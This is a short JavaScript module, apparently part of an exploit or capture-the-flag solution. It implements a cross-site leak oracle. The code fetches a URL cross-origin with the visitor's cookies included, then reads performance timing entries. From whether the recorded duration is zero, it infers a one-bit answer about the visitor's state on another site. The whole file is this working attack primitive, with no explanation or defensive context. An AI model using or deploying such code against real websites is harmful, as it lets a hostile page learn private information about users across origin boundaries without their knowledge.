const leak = async (url) => {
    return new Promise(async(r) => {
        await fetch(url, {mode:'no-cors', credentials: 'include'})
        await sleep(300)
    
        let perf = performance.getEntriesByType("resource").filter((e) => {
            return e.name === url
        }).pop()
        console.debug('Duration: ', perf.duration)
        
        if(perf.duration <= 0){
            return r(1)
        }else{
            return r(0)
        }
        
    })
}
const sleep = (ms) => {
    return new Promise(r => setTimeout(r, ms));
}

export { leak }